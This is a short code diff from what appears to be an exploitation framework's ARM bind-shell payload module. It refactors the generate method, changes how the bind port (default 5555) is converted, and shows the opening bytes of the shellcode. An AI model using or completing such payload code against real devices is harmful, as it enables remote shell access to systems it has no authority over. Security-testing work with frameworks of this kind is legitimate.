@@ -18,12 +18,12 @@ class Exploit(payloads.Payload):
     }
 
     architecture = "armle"
+
     port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
 
     def generate(self):
-        bind_port = self.convert_port(self.port)
-
-        self.payload = (
+        bind_port = validators.convert_port(self.port)
+        return(
             "\x02\x00\xa0\xe3" +
             "\x01\x10\xa0\xe3" +
             "\x06\x20\xa0\xe3" +
